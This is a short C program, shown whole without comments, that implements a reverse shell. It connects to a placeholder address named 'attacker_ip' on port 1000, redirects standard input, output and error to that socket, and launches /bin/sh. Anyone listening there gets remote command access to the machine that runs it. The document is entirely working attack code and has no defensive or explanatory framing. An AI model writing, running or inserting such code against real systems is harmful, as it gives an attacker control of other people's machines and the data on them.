#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char *attacker_ip = "attacker_ip";
    int attacker_port = 1000;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(attacker_port);
    inet_pton(AF_INET, attacker_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        close(sock);
        exit(1);
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl("/bin/sh", "sh", NULL);

    perror("execl failed");
    close(sock);
    return 0;
}